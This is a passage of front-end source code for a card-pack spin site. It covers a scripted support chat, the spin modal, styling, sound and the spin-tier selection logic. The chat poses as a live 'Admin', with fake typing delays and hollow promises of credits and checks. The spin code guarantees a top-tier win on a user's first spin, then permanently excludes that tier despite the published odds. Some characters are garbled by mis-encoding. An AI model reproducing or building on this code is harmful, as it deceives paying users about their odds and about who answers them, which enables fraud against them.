                if (msg.includes('withdraw') || msg.includes('withdrawal') || msg.includes('withdrawl')) {
                    pendingRequest = null;
                    return 'For new users it can take a bit longer. Usual window is 2â€“7 business days.';
                }
                if (msg.includes('ship') || msg.includes('shipping') || msg.includes('tracking') || msg.includes('deliver')) {
                    pendingRequest = null;
                    return 'Shipping is 3â€“7 business days. Youâ€™ll get tracking once the label is created.';
                }
                if (msg.includes('error') || msg.includes('bug') || msg.includes('glitch') || msg.includes('freeze') || msg.includes('stuck')) {
                    pendingRequest = 'pack_time';
                    return 'If it didnâ€™t complete, I can add a credit. Send the pack name and time.';
                }
                if (msg.includes('credit') || msg.includes('refund') || msg.includes('charged')) {
                    pendingRequest = 'pack_time';
                    return 'If a charge or spin failed, I can credit it back. Tell me which pack and time.';
                }
                if (hasPack || hasTime || hasPrice) {
                    pendingRequest = null;
                    return 'Got it. Iâ€™ll check that spin and update you here.';
                }
                if (pendingRequest === 'pack_time') {
                    return 'Tell me the pack name and time so I can check it.';
                }
                return '';
            }

            function handleSupportSend() {
                const input = document.getElementById('chatInput');
                if (!input) return;
                const text = input.value.trim();
                if (!text) return;
                input.value = '';
                appendMessage('user', 'You', text);
                showTyping(true);
                if (replyTimer) clearTimeout(replyTimer);
                const delay = 3000 + Math.floor(Math.random() * 2000);
                replyTimer = setTimeout(() => {
                    const reply = getReply(text);
                    if (reply) {
                        appendMessage('admin', 'Admin', reply);
                    }
                    showTyping(false);
                }, delay);
            }

            window.handleSupportSend = handleSupportSend;

            function initSupportChat() {
                const msgEl = document.getElementById('chatMessages');
                const sendBtn = document.getElementById('chatSend');
                if (!msgEl || !sendBtn) return;
                msgEl.innerHTML = '';
                history.forEach(item => appendMessage(item.role, item.name, item.text, item.time));
                showTyping(false);
            }

            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', initSupportChat);
            } else {
                initSupportChat();
            }
        })();
    </script>

    <!-- Card Spin Modal -->
    <div id="spinOverlay" style="display:none;position:fixed;inset:0;z-index:20000;background:rgba(0,0,0,0.97);flex-direction:column;align-items:center;justify-content:center;font-family:'Press Start 2P',monospace;">
        <button id="spinSoundToggle" class="sound-toggle" onclick="toggleSound()">SOUND: ON</button>
        <div id="spinTitle" style="color:#00ff00;font-size:11px;margin-bottom:6px;letter-spacing:2px;">SPINNING...</div>
        <div id="spinSubtitle" style="color:#555;font-size:7px;margin-bottom:24px;">Good luck!</div>

        <!-- Tier indicator strip -->
        <div class="tier-strip" style="display:flex;gap:5px;margin-bottom:22px;align-items:center;">
            <div style="position:relative;width:42px;height:12px;background:linear-gradient(180deg,#333,#777);border:1px solid #888;">
                <div id="tierGlow0" style="position:absolute;inset:0;opacity:0;background:#aaa;transition:opacity 0.08s;"></div>
            </div>
            <div style="position:relative;width:42px;height:12px;background:linear-gradient(180deg,#0a2255,#4499ff);border:1px solid #4499ff;">
                <div id="tierGlow1" style="position:absolute;inset:0;opacity:0;background:#4499ff;transition:opacity 0.08s;"></div>
            </div>
            <div style="position:relative;width:42px;height:12px;background:linear-gradient(180deg,#664400,#ffd700);border:1px solid #ffd700;">
                <div id="tierGlow2" style="position:absolute;inset:0;opacity:0;background:#ffd700;transition:opacity 0.08s;"></div>
            </div>
            <div style="position:relative;width:42px;height:12px;background:linear-gradient(180deg,#330066,#cc44ff);border:1px solid #cc44ff;">
                <div id="tierGlow3" style="position:absolute;inset:0;opacity:0;background:#cc44ff;transition:opacity 0.08s;"></div>
            </div>
            <div style="position:relative;width:42px;height:12px;background:linear-gradient(90deg,red,orange,yellow,green,#4499ff,violet);border:1px solid #fff;">
                <div id="tierGlow4" style="position:absolute;inset:0;opacity:0;background:#fff;transition:opacity 0.08s;"></div>
            </div>
        </div>
        <div class="tier-labels" style="display:flex;gap:5px;margin-bottom:20px;">
            <div style="font-size:6px;color:#888;width:42px;text-align:center;">GREY</div>
            <div style="font-size:6px;color:#4499ff;width:42px;text-align:center;">BLUE</div>
            <div style="font-size:6px;color:#ffd700;width:42px;text-align:center;">GOLD</div>
            <div style="font-size:6px;color:#cc44ff;width:42px;text-align:center;">PURPLE</div>
            <div style="font-size:6px;color:#fff;width:42px;text-align:center;">RAINBOW</div>
        </div>

        <!-- Spinning Card -->
        <div id="spinStage" class="spin-stage" style="perspective:900px;width:190px;height:270px;margin-bottom:28px;">
            <div id="spinCard" style="width:190px;height:270px;border:3px solid #00ff00;border-radius:6px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;transform-origin:center;will-change:transform,background;background:#111;">
                <div id="spinCardIcon" style="font-size:54px;line-height:1;transition:opacity 0.05s;">?</div>
                <div id="spinCardTier" style="font-size:10px;letter-spacing:2px;"></div>
                <div id="spinCardMult" style="font-size:9px;color:#aaa;"></div>
            </div>
        </div>

        <!-- Result (hidden until spin finishes) -->
        <div id="spinResultBox" style="display:none;text-align:center;">
            <div id="spinResultLabel" style="font-size:11px;margin-bottom:8px;"></div>
            <div id="spinPrizeImg" style="display:none;margin-bottom:10px;">
                <img id="spinPrizeImgEl" src="" style="width:140px;height:140px;object-fit:contain;border:2px solid #ffffff;border-radius:4px;background:#111;" loading="lazy">
            </div>
            <div id="spinResultAmount" style="font-size:22px;margin-bottom:6px;font-weight:bold;"></div>
            <div id="spinResultSub" style="font-size:7px;color:#888;margin-bottom:22px;line-height:1.8;"></div>
            <button class="claim-btn spin-claim-btn" onclick="closeSpinModal()" style="background:#00ff00;color:#000;border:none;padding:14px 0;font-family:'Press Start 2P',monospace;font-size:9px;cursor:pointer;width:210px;">CLAIM</button>
        </div>
    </div>

    <style>
        #spinOverlay { transition: background 0.2s ease; }
        #spinOverlay.spin-focus { background: rgba(0,0,0,0.985); }
        #spinOverlay.spin-focus .tier-strip,
        #spinOverlay.spin-focus .tier-labels { opacity: 0.7; transition: opacity 0.2s ease; }
        #spinOverlay.spin-focus #spinSubtitle { opacity: 0.7; }
        #spinOverlay.spin-focus .spin-stage { transform: scale(1.02); }
        body.spin-focus { overflow: hidden; }
        body.spin-focus .top-header,
        body.spin-focus .bottom-nav { opacity: 0; pointer-events: none; }

        .spin-stage { transition: transform 0.2s ease; }
        .spin-stage.land-impact { animation: landImpact 0.35s ease; }

        .sound-toggle {
            position: absolute;
            top: 12px;
            right: 12px;
            background: #111;
            color: #7dffb2;
            border: 1px solid #333;
            padding: 6px 8px;
            font-family: 'Press Start 2P', monospace;
            font-size: 7px;
            cursor: pointer;
            letter-spacing: 1px;
            box-shadow: 0 0 10px rgba(0,255,150,0.25);
        }
        .sound-toggle.off {
            color: #777;
            border-color: #444;
            box-shadow: none;
        }

        #spinCard { position: relative; overflow: hidden; }
        #spinCard.rarity-grey::after,
        #spinCard.rarity-blue::after,
        #spinCard.rarity-gold::after,
        #spinCard.rarity-purple::after,
        #spinCard.rarity-rainbow::after {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: inherit;
            pointer-events: none;
        }
        #spinCard.rarity-grey::after {
            box-shadow: inset 0 0 18px rgba(0,0,0,0.45), 0 0 10px rgba(180,180,180,0.25);
            opacity: 0.5;
        }
        #spinCard.rarity-blue::after {
            box-shadow: 0 0 16px rgba(68,153,255,0.55), inset 0 0 12px rgba(68,153,255,0.35);
            opacity: 0.55;
        }
        #spinCard.rarity-gold::after {
            background: linear-gradient(120deg, transparent 35%, rgba(255,215,0,0.35) 50%, transparent 65%);
            animation: goldShimmer 2.8s linear infinite;
            mix-blend-mode: screen;
        }
        #spinCard.rarity-purple::after {
            border: 1px solid rgba(204,68,255,0.8);
            box-shadow: 0 0 14px rgba(204,68,255,0.65), inset 0 0 10px rgba(204,68,255,0.35);
            animation: purplePulse 1.2s ease-in-out infinite;
        }
        #spinCard.rarity-rainbow::after {
            background: linear-gradient(90deg, red, orange, yellow, green, #4499ff, violet, red);
            background-size: 200% 200%;
            animation: rainbowMove 1.8s linear infinite;
            opacity: 0.35;
            mix-blend-mode: screen;
        }

        .claim-btn,
        .spin-claim-btn {
            box-shadow: 0 0 16px rgba(0,255,0,0.35), 0 0 28px rgba(0,255,0,0.25);
            animation: claimGlow 1.6s ease-in-out infinite;
        }
        .spin-claim-btn.spin-claim-alt {
            box-shadow: 0 0 10px rgba(255,255,255,0.2);
            animation: none;
        }

        @keyframes cardGlowPulse {
            0%,100% { filter:brightness(1); }
            50%      { filter:brightness(1.7); }
        }
        @keyframes promoScroll {
            0%   { transform: translateX(0); }
            100% { transform: translateX(-50%); }
        }
        @keyframes packCardIn {
            0%   { opacity:0; transform:rotate(var(--pack-tilt, 0deg)) translateY(calc(var(--pack-nudge, 0px) + 26px)) scale(0.94); }
            100% { opacity:1; transform:rotate(var(--pack-tilt, 0deg)) translateY(var(--pack-nudge, 0px)) scale(1); }
        }
        @keyframes packFloat {
            0%   { transform:rotate(var(--pack-tilt, 0deg)) translateY(calc(var(--pack-nudge, 0px) + var(--pack-lift, 0px))) scale(var(--pack-scale, 1)); }
            50%  { transform:rotate(var(--pack-tilt, 0deg)) translateY(calc(var(--pack-nudge, 0px) + var(--pack-lift, 0px) - 6px)) scale(var(--pack-scale, 1)); }
            100% { transform:rotate(var(--pack-tilt, 0deg)) translateY(calc(var(--pack-nudge, 0px) + var(--pack-lift, 0px))) scale(var(--pack-scale, 1)); }
        }
        @keyframes packSpark {
            0%   { opacity:0; transform:scale(0.85); }
            40%  { opacity:0.7; }
            100% { opacity:0; transform:scale(1.15); }
        }
        @keyframes livePulse {
            0%,100% { transform:scale(0.8); opacity:0.7; }
            50%     { transform:scale(1.2); opacity:1; }
        }
        @keyframes imgFloat {
            0%,100% { transform:translateY(0px); }
            50%      { transform:translateY(-8px); }
        }
        @keyframes btnPulse {
            0%,100% { box-shadow:0 5px 20px var(--c,#ffd700)88; }
            50%      { box-shadow:0 5px 35px var(--c,#ffd700)cc; filter:brightness(1.15); }
        }
        @keyframes btnWiggle {
            0%,90%,100% { transform:rotate(0deg); }
            93%  { transform:rotate(-1.5deg); }
            96%  { transform:rotate(1.5deg); }
        }
        @keyframes btnBolt {
            0%,100%{ filter:brightness(1); }
            50%    { filter:brightness(1.3) saturate(1.4); }
        }
        @keyframes btnShine {
            0%,100%{ filter:brightness(1); }
            40%,60%{ filter:brightness(1.2); }
        }
        @keyframes btnFlicker {
            0%,100%{ opacity:1; }
            92%    { opacity:0.7; }
            94%    { opacity:1; }
            96%    { opacity:0.5; }
            98%    { opacity:1; }
        }
        @keyframes featuredShimmer {
            0%   { left:-100%; }
            40%  { left:150%; }
            100% { left:150%; }
        }
        @keyframes goldShimmer {
            0%   { transform: translateX(-120%); opacity: 0; }
            25%  { opacity: 0.6; }
            50%  { transform: translateX(120%); opacity: 0.35; }
            100% { transform: translateX(120%); opacity: 0; }
        }
        @keyframes purplePulse {
            0%,100% { opacity: 0.5; }
            50%     { opacity: 1; }
        }
        @keyframes rainbowMove {
            0%   { background-position: 0% 50%; }
            100% { background-position: 200% 50%; }
        }
        @keyframes packShake {
            0%,100% { transform:translateX(0) rotate(0deg); }
            10%      { transform:translateX(-10px) rotate(-3deg); }
            20%      { transform:translateX(10px) rotate(3deg); }
            30%      { transform:translateX(-12px) rotate(-4deg) scale(1.04); }
            40%      { transform:translateX(12px) rotate(4deg) scale(1.06); }
            50%      { transform:translateX(-8px) rotate(-2deg) scale(1.08); }
            60%      { transform:translateX(8px) rotate(2deg) scale(1.06); }
            70%      { transform:translateX(-5px) rotate(-1deg) scale(1.04); }
            80%      { transform:translateX(5px) rotate(1deg); }
            90%      { transform:translateX(-3px); }
        }
        @keyframes landImpact {
            0%   { transform: scale(1); }
            40%  { transform: scale(1.08); }
            100% { transform: scale(1); }
        }
        @keyframes impactShake {
            0%   { transform: scale(1); }
            20%  { transform: scale(1.08) rotate(-1.5deg); }
            40%  { transform: scale(1.02) rotate(1.5deg); }
            60%  { transform: scale(1.05) rotate(-1deg); }
            80%  { transform: scale(1.01) rotate(1deg); }
            100% { transform: scale(1); }
        }
        @keyframes rainbowBg {
            0%  { background:linear-gradient(160deg,#ff0000,#ff8800,#ffff00,#00ff00); }
            50% { background:linear-gradient(160deg,#0088ff,#aa00ff,#ff0055,#ff8800); }
            100%{ background:linear-gradient(160deg,#ff0000,#ff8800,#ffff00,#00ff00); }
        }
        @keyframes claimGlow {
            0%,100% { box-shadow: 0 0 14px rgba(0,255,0,0.35), 0 0 24px rgba(0,255,0,0.2); }
            50%     { box-shadow: 0 0 22px rgba(0,255,0,0.55), 0 0 36px rgba(0,255,0,0.35); }
        }
        @keyframes spinResultIn {
            from { opacity:0; transform:translateY(16px) scale(0.9); }
            to   { opacity:1; transform:translateY(0)   scale(1);   }
        }
        #spinResultBox { animation: spinResultIn 0.45s ease; }

        /* â”€â”€ MOBILE RESPONSIVE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        @media (max-width: 768px) {
            /* Prevent iOS zoom on input focus */
            input, select, textarea,
            input[type="text"], input[type="email"],
            input[type="password"], input[type="number"] {
                font-size: 16px !important;
                -webkit-text-size-adjust: 100%;
                touch-action: manipulation;
            }

            /* â”€â”€ Header: hide clutter, keep logo + balance + user btn â”€â”€ */
            .top-header {
                height: auto;
                padding: 8px 10px;
                gap: 6px;
                flex-direction: column;
                align-items: flex-start;
                flex-wrap: wrap;
            }
            .header-right {
                width: 100%;
                justify-content: space-between;
            }
            .main-content { margin-top: 96px; padding-bottom: 68px; }

            /* Hide the center section (NEW badge + mystery notif) */
            .header-center { display: none !important; }

            /* Hide rank progress bar in header */
            .rank-info { display: none !important; }

            /* Hide beta tag */
            .beta-tag { display: none !important; }

            /* Shrink logo */
            .logo { font-size: 14px !important; gap: 5px; }
            .logo .santa-hat { font-size: 12px !important; }

            /* Shrink balance pill */
            #balanceDisplay {
                font-size: 7px !important;
                padding: 3px 7px !important;
                margin-right: 5px !important;
            }

            /* Shrink user button */
            .user-button {
                font-size: 7px !important;
                padding: 5px 8px !important;
                gap: 4px !important;
            }

            /* Shrink get started button */
            .get-started-btn {
                font-size: 7px !important;
                padding: 5px 8px !important;
            }

            /* â”€â”€ Packs grid â”€â”€ */
            .packs-grid {
                display: flex;
                flex-direction: column;
                gap: 16px;
                padding: 12px 10px;
            }
            .packs-scroller {
                display: flex;
                flex-direction: column;
                gap: 16px;
                overflow: visible;
                scroll-snap-type: y mandatory;
            }
            .packs-scroller > .pack-card,
            .packs-scroller > .coming-soon-card {
                flex: 1 1 auto;
                width: 100%;
                scroll-snap-align: start;
            }
            .pack-card {
                filter: brightness(0.95) saturate(0.95);
                box-shadow: 0 0 12px rgba(0,255,100,0.25) !important;
                padding: 18px 14px !important;
            }
            .pack-card img { width: 110px !important; height: 110px !important; }
            .grand-opening { box-shadow: 0 0 15px rgba(255,200,0,0.2) !important; }

            /* â”€â”€ Bottom nav â”€â”€ */
            .bottom-nav { height: auto; padding: 12px 0; justify-content: space-around; }
            .nav-item { font-size: 14px; padding: 5px 3px; gap: 6px; }
            .nav-icon img { height: 28px !important; }

            /* â”€â”€ Modals â”€â”€ */
            .modal {
                width: 96vw !important;
                max-width: 96vw !important;
                padding: 20px 12px !important;
            }
            .modal-title { font-size: 11px !important; }
            .modal-btn { font-size: 7px !important; padding: 10px 8px !important; }

            /* â”€â”€ Spin overlay â”€â”€ */
            #spinOverlay { padding: 8px 0; }
            #spinCard { width: 150px !important; height: 210px !important; }
            #spinCard img { width: 80px !important; height: 80px !important; }
            #spinOverlay.spin-focus .tier-strip,
            #spinOverlay.spin-focus .tier-labels { display: none; }
            #spinOverlay.spin-focus #spinSubtitle { display: none; }
            #spinOverlay.spin-focus .spin-stage { transform: scale(1.05); }
            #spinOverlay.spin-focus .tier-strip,
            #spinOverlay.spin-focus .tier-labels { opacity: 0.25; }
            .sound-toggle { top: 8px; right: 8px; font-size: 6px; padding: 5px 6px; }

            /* â”€â”€ Chase packs â”€â”€ */
            .chase-packs-grid {
                grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)) !important;
            }

            /* â”€â”€ Homepage â”€â”€ */
            .homepage-hero { padding: 20px 10px; }
            .slogan { font-size: 18px !important; }
            .hero-subtitle { max-width: 90%; margin: 0 auto; line-height: 1.4; }

            /* â”€â”€ Tier strip in spin modal â”€â”€ */
            #spinOverlay .tier-strip { gap: 3px !important; }

            /* â”€â”€ Profile header fixes â”€â”€ */
            .profile-header {
                grid-template-columns: 1fr;
                padding: 20px 14px;
                gap: 14px;
            }
            .profile-actions {
                position: static !important;
                width: 100%;
                flex-direction: column;
                align-items: stretch !important;
                gap: 8px;
            }
            .profile-actions .modal-btn,
            .profile-actions .music-toggle {
                width: 100%;
            }

            /* â”€â”€ Buttons: tap comfort â”€â”€ */
            .main-content button,
            .modal-btn,
            .spin-claim-btn,
            .chat-input button {
                min-height: 52px;
                font-size: 16px;
            }

            body { -webkit-tap-highlight-color: transparent; }
        }

        @media (max-width: 420px) {
            .logo { font-size: 12px !important; }
            .slogan { font-size: 14px !important; }
            #spinCard { width: 130px !important; height: 185px !important; }
            .packs-grid { gap: 8px; padding: 8px; }
            .user-button span:last-child { display: none; } /* hide â–¼ arrow */
        }
    </style>

    <script>
        const SPIN_TIERS = [
            { name:'GREY',    gradient:'linear-gradient(160deg,#222,#666,#222)',                         border:'#888888', glow:'rgba(136,136,136,0.5)', minMult:0.05, maxMult:0.15, chance:0.03 },
            { name:'BLUE',    gradient:'linear-gradient(160deg,#061833,#4499ff,#061833)',                border:'#4499ff', glow:'rgba(68,153,255,0.7)',  minMult:1.15, maxMult:1.45, chance:0.27 },
            { name:'GOLD',    gradient:'linear-gradient(160deg,#4a2e00,#ffd700,#4a2e00)',                border:'#ffd700', glow:'rgba(255,215,0,0.8)',   minMult:4.0,  maxMult:4.5,  chance:0.32 },
            { name:'PURPLE',  gradient:'linear-gradient(160deg,#1e0033,#cc44ff,#1e0033)',                border:'#cc44ff', glow:'rgba(204,68,255,0.85)', minMult:2.25, maxMult:2.75, chance:0.30 },
            { name:'RAINBOW', gradient:'linear-gradient(160deg,red,orange,yellow,green,#4499ff,violet)', border:'#ffffff', glow:'rgba(255,255,255,0.95)',minMult:null, maxMult:null, chance:0.08 },
        ];

        // â”€â”€ Spin sound system (tiny, optional) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        let soundEnabled = JSON.parse(localStorage.getItem('pluxo_sound_enabled') || 'true');
        let audioCtx = null;
        function initAudio(force = false) {
            if (!soundEnabled && !force) return;
            if (!audioCtx) {
                const Ctx = window.AudioContext || window.webkitAudioContext;
                if (!Ctx) return;
                audioCtx = new Ctx();
            }
            if (audioCtx.state === 'suspended') audioCtx.resume();
        }
        function updateSoundToggle() {
            const btn = document.getElementById('spinSoundToggle');
            if (!btn) return;
            btn.textContent = soundEnabled ? 'SOUND: ON' : 'SOUND: OFF';
            btn.classList.toggle('off', !soundEnabled);
        }
        function toggleSound() {
            soundEnabled = !soundEnabled;
            localStorage.setItem('pluxo_sound_enabled', JSON.stringify(soundEnabled));
            if (soundEnabled) initAudio();
            updateSoundToggle();
            if (soundEnabled) playTone({ freq: 520, duration: 0.05, type: 'triangle', gain: 0.03 });
        }
        function playTone({ freq = 440, duration = 0.12, type = 'sine', gain = 0.05, detune = 0 } = {}) {
            if (!soundEnabled) return;
            initAudio();
            if (!audioCtx) return;
            const ctx = audioCtx;
            const osc = ctx.createOscillator();
            const g = ctx.createGain();
            osc.type = type;
            osc.frequency.value = freq;
            osc.detune.value = detune;
            g.gain.setValueAtTime(0.0001, ctx.currentTime);
            g.gain.exponentialRampToValueAtTime(gain, ctx.currentTime + 0.015);
            g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + duration);
            osc.connect(g).connect(ctx.destination);
            osc.start();
            osc.stop(ctx.currentTime + duration + 0.03);
        }
        function playTick(intensity = 0.5) {
            const freq = 900 - intensity * 350;
            const gain = 0.02 + (1 - intensity) * 0.02;
            playTone({ freq, duration: 0.06, type: 'square', gain });
        }
        function playSpinWhoosh() {
            playTone({ freq: 220, duration: 0.18, type: 'sawtooth', gain: 0.035 });
        }
        function playLand() {
            playTone({ freq: 140, duration: 0.16, type: 'triangle', gain: 0.06 });
        }
        function playRare() {
            playTone({ freq: 1100, duration: 0.18, type: 'sine', gain: 0.07 });
        }

        // â”€â”€ Background music (simple chiptune loop) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        let musicEnabled = JSON.parse(localStorage.getItem('pluxo_music_enabled') || 'true');
        let musicTimer = null;
        let musicStep = 0;
        let musicGain = null;
        const NOTE_FREQ = {
            A4: 440.0, B4: 493.88, C5: 523.25, D5: 587.33, E5: 659.25, F5: 698.46,
            G5: 783.99, A5: 880.0
        };
        const MUSIC_SEQ = [
            ['E5', 180], ['B4', 180], ['C5', 180], ['D5', 180],
            ['C5', 180], ['B4', 180], ['A4', 220], ['REST', 120],
            ['A4', 160], ['C5', 180], ['E5', 180], ['A5', 220],
            ['G5', 220], ['E5', 180], ['C5', 180], ['D5', 180],
            ['B4', 240], ['REST', 140]
        ];
        function playMusicNote(note, durationMs) {
            if (!musicEnabled) return;
            initAudio(true);
            if (!audioCtx) return;
            if (!musicGain) {
                musicGain = audioCtx.createGain();
                musicGain.gain.value = 0.025;
                musicGain.connect(audioCtx.destination);
            }
            if (note === 'REST') return;
            const freq = NOTE_FREQ[note] || 0;
            if (!freq) return;
            const osc = audioCtx.createOscillator();
            osc.type = 'square';
            osc.frequency.value = freq;
            osc.connect(musicGain);
            const now = audioCtx.currentTime;
            osc.start(now);
            osc.stop(now + durationMs / 1000);
        }
        function startMusic() {
            if (!musicEnabled) return;
            initAudio(true);
            if (!audioCtx || musicTimer) return;
            const schedule = () => {
                if (!musicEnabled) { stopMusic(); return; }
                const [note, dur] = MUSIC_SEQ[musicStep % MUSIC_SEQ.length];
                playMusicNote(note, dur);
                musicStep++;
                musicTimer = setTimeout(schedule, dur);
            };
            schedule();
        }
        function stopMusic() {
            if (musicTimer) { clearTimeout(musicTimer); musicTimer = null; }
        }
        function updateMusicToggle() {
            const btn = document.getElementById('musicToggle');
            if (!btn) return;
            btn.textContent = musicEnabled ? 'MUSIC: ON' : 'MUSIC: OFF';
            btn.classList.toggle('off', !musicEnabled);
        }
        function toggleMusic() {
            musicEnabled = !musicEnabled;
            localStorage.setItem('pluxo_music_enabled', JSON.stringify(musicEnabled));
            updateMusicToggle();
            if (musicEnabled) startMusic();
            else stopMusic();
        }

        // â”€â”€ Grey gating: only after a good win (gold/purple), max 2 times â”€â”€â”€
        function getGreyData() {
            if (!currentUser) return { count: 0, hasGoodWin: false };
            return JSON.parse(localStorage.getItem('pluxo_grey_'+currentUser.username) || '{"count":0,"hasGoodWin":false}');
        }
        function setGreyData(d) {
            if (!currentUser) return;
            localStorage.setItem('pluxo_grey_'+currentUser.username, JSON.stringify(d));
        }
        function greyAllowed() {
            const d = getGreyData();
            return d.hasGoodWin && d.count < 2;
        }
        function recordGoodWin() {
            const d = getGreyData();
            d.hasGoodWin = true;
            setGreyData(d);
        }
        function recordGreyHit() {
            const d = getGreyData();
            d.count = Math.min((d.count || 0) + 1, 2);
            setGreyData(d);
        }

        // â”€â”€ Rainbow weekly cap (3 per user per week) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        function getRainbowWeeklyCount() {
            if (!currentUser) return 0;
            const d = JSON.parse(localStorage.getItem('pluxo_rbow_'+currentUser.username) || '{"n":0,"w":0}');
            const week = Math.floor(Date.now() / 604800000);
            return d.w === week ? d.n : 0;
        }
        function incrementRainbowWeekly() {
            if (!currentUser) return;
            const week = Math.floor(Date.now() / 604800000);
            const d = JSON.parse(localStorage.getItem('pluxo_rbow_'+currentUser.username) || '{"n":0,"w":0}');
            localStorage.setItem('pluxo_rbow_'+currentUser.username, JSON.stringify({ n: d.w===week ? d.n+1 : 1, w: week }));
        }

        let spinPackCost  = 0;
        let spinPackImg   = '';
        let spinPackName  = '';
        let spinQueue     = [];
        let _lastPrizes   = []; // track last 5 prizes to avoid repeats
        let spinCurrent  = 0;
        let spinsSinceRainbow = parseInt(localStorage.getItem('pluxo_pity') || '0');

        // â”€â”€ Lifetime rainbow counter â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        function getLifetimeRainbows() {
            if (!currentUser) return 0;
            return parseInt(localStorage.getItem('pluxo_rb_life_' + currentUser.username) || '0');
        }
        function incrementLifetimeRainbows() {
            if (!currentUser) return;
            const key = 'pluxo_rb_life_' + currentUser.username;
            localStorage.setItem(key, String(getLifetimeRainbows() + 1));
        }

        function pickSpinTier() {
            const rbIdx    = SPIN_TIERS.length - 1;
            const lifetimeRb = getLifetimeRainbows();

            // â”€â”€ FIRST SPIN EVER = 100% RAINBOW (increment immediately so multi-pack can't give it twice) â”€â”€
            if (lifetimeRb === 0) {
                incrementLifetimeRainbows(); // lock it out right now
                return rbIdx;
            }

            // â”€â”€ ALREADY HIT RAINBOW ONCE = CAN NEVER GET IT AGAIN â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            // Pick from non-rainbow tiers only
            const weights = [];
            let total = 0;
            for (let i = 0; i < rbIdx; i++) {
                const blocked = SPIN_TIERS[i].name === 'GREY' && !greyAllowed();
                const w = blocked ? 0 : SPIN_TIERS[i].chance;
                weights.push(w);
                total += w;
            }

            const rand = Math.random();
            let cum = 0, resultIdx = 1; // default BLUE
            for (let i = 0; i < weights.length; i++) {
                cum += weights[i] / total;
                if (rand < cum) { resultIdx = i; break; }
            }

            if (SPIN_TIERS[resultIdx].name === 'GREY' && !greyAllowed()) resultIdx = 1;
            spinsSinceRainbow++;
            localStorage.setItem('pluxo_pity', String(spinsSinceRainbow));
            return resultIdx;
        }

        function openSpinModal(costPerPack, quantity, packImg, packName) {
            spinPackCost = costPerPack;
            spinPackImg  = packImg || '';
            spinPackName = packName || '';
            spinQueue = []; spinCurrent = 0;
            for (let q = 0; q < quantity; q++) spinQueue.push(pickSpinTier());
            startNextSpin();
        }

        function startNextSpin() {
            if (spinCurrent >= spinQueue.length) return;
            const overlay = document.getElementById('spinOverlay');
            overlay.style.display = 'flex';
            overlay.classList.add('spin-focus');
            document.body.classList.add('spin-focus');
            updateSoundToggle();
            document.getElementById('spinResultBox').style.display = 'none';
            const _piw = document.getElementById('spinPrizeImg'); if(_piw) _piw.style.display='none';
            document.getElementById('spinTitle').textContent    = spinQueue.length > 1
                ? 'PACK ' + (spinCurrent + 1) + ' OF ' + spinQueue.length : 'SPINNING...';
            document.getElementById('spinTitle').style.color    = '#00ff00';
            document.getElementById('spinSubtitle').textContent = 'Good luck!';
            document.getElementById('spinSubtitle').style.color = '#aaa';
            const iconEl = document.getElementById('spinCardIcon');
            if (spinPackImg) {
                iconEl.innerHTML = `<img src="${spinPackImg}" style="width:110px;height:110px;object-fit:contain;filter:drop-shadow(0 0 14px rgba(0,255,0,0.6));">`;
            } else {
                iconEl.textContent = '?';
            }
            document.getElementById('spinCardTier').textContent = '';
            document.getElementById('spinCardMult').textContent = '';
            const card = document.getElementById('spinCard');
            card.style.cssText = 'width:190px;height:270px;border:3px solid #00ff00;border-radius:6px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;transform-origin:center;background:#111;';
            card.classList.remove('rarity-grey','rarity-blue','rarity-gold','rarity-purple','rarity-rainbow');
            card.style.filter = 'none';
            card.style.animation = '';
            card.style.backgroundSize = 'auto';
            for (let i = 0; i < 5; i++) { const g = document.getElementById('tierGlow'+i); if(g) g.style.opacity='0'; }
            setTimeout(() => runSpin(spinQueue[spinCurrent]), 400);
        }

        function runSpin(targetIdx) {
            const SEG       = 360 / SPIN_TIERS.length;
            const fullSpins = 9 + Math.floor(Math.random() * 5);
            const landAngle = targetIdx * SEG + SEG / 2;
            const totalRot  = fullSpins * 360 + landAngle;
            const duration  = 4400;
            let   startTime = null;
            let   lastIdx   = -1;
            let   lastDisplayIdx = -1;
            const goldIdx   = SPIN_TIERS.findIndex(t => t.name === 'GOLD');
            const purpleIdx = SPIN_TIERS.findIndex(t => t.name === 'PURPLE');
            const rainbowIdx = SPIN_TIERS.findIndex(t => t.name === 'RAINBOW');

            initAudio();
            playSpinWhoosh();

            function ease(t) { return 1 - Math.pow(1 - t, 4); }
            function idxAt(a) { return Math.floor(((a % 360) + 360) % 360 / SEG) % SPIN_TIERS.length; }

            function frame(ts) {
                if (!startTime) startTime = ts;
                const t      = Math.min((ts - startTime) / duration, 1);
                const angle  = ease(t) * totalRot;
                const scaleX = Math.abs(Math.cos(angle * Math.PI / 180));
                const idx    = idxAt(angle);
                const tier   = SPIN_TIERS[idx];
                const card   = document.getElementById('spinCard');

                const spinIntensity = Math.max(0, 1 - t);
                const jitterY = (Math.sin(ts * 0.06) + (Math.random() - 0.5) * 0.6) * (3 + spinIntensity * 4);
                const jitterRot = Math.sin(ts * 0.05) * (1 + spinIntensity * 2);
                const blur = spinIntensity * 1.1;
                const hue = Math.sin(ts * 0.02) * (8 + spinIntensity * 22);
                const zoom = 1.02;
